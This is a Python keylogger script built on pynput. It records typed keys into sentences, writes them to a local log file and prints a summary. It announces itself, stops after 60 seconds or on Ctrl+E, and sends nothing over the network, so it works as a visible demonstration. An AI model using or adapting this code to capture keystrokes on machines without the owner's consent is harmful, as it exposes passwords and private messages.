import os
import time
from datetime import datetime
from pynput import keyboard

class ProKeyLogger:
    def __init__(self, duration=60):
        self.duration = duration  # Time limit in seconds
        self.start_time = time.time()
        self.current_sentence = ""
        self.full_log = []
        self.pressed_keys = set()
        self.special_keys = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "\n[ENTER]\n",
            keyboard.Key.tab: "[TAB]",
            keyboard.Key.backspace: "[BACKSPACE]",
            keyboard.Key.esc: "[ESC]",
        }
        self.log_file = self.create_log_file()

    def create_log_file(self):
        log_dir = "logs"
        os.makedirs(log_dir, exist_ok=True)
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        return os.path.join(log_dir, f"ProKeyLog_{timestamp}.txt")

    def write_log_to_file(self):
        with open(self.log_file, "w") as f:
            f.write("📝 ProKeyLogger Log File\n")
            f.write(f"📅 Session Time: {datetime.now()}\n\n")
            for line in self.full_log:
                f.write(line)
        print(f"\n✅ Log saved to: {self.log_file}")

    def print_summary(self):
        total_words = sum(len(line.split()) for line in self.full_log)
        duration = round(time.time() - self.start_time, 2)
        print(f"\n🧾 Summary:")
        print(f"  Words typed     : {total_words}")
        print(f"  Session duration: {duration} seconds")

    def on_press(self, key):
        # Auto exit after time
        if time.time() - self.start_time > self.duration:
            print("\n⏰ Time limit reached. Stopping logger...")
            return False

        # Detect Ctrl + E for manual exit
        self.pressed_keys.add(key)
        if (keyboard.Key.ctrl_l in self.pressed_keys or keyboard.Key.ctrl_r in self.pressed_keys) and \
           (key == keyboard.KeyCode.from_char('e')):
            print("\n🔒 Ctrl + E detected. Exiting logger...")
            return False

        try:
            if key in self.special_keys:
                special = self.special_keys[key]
                if special == "\n[ENTER]\n":
                    self.full_log.append(self.current_sentence + "\n")
                    self.current_sentence = ""
                elif special == "[BACKSPACE]":
                    self.current_sentence = self.current_sentence[:-1]
                else:
                    self.current_sentence += special
            elif hasattr(key, 'char') and key.char is not None:
                self.current_sentence += key.char
        except Exception as e:
            print(f"⚠️ Error: {e}")

    def on_release(self, key):
        if key in self.pressed_keys:
            self.pressed_keys.remove(key)

    def run(self):
        print("🔐 ProKeyLogger Started!")
        print(f"🕒 It will auto-stop in {self.duration} seconds or press Ctrl + E to exit manually.")
        print("📂 Logs saved in /logs folder.\n")

        with keyboard.Listener(
            on_press=self.on_press,
            on_release=self.on_release
        ) as listener:
            listener.join()

        # Save last sentence if not already saved
        if self.current_sentence.strip():
            self.full_log.append(self.current_sentence + "\n")

        self.write_log_to_file()
        self.print_summary()

# Run the logger
if __name__ == "__main__":
    logger = ProKeyLogger(duration=60)  # Log for 60 seconds
    logger.run()
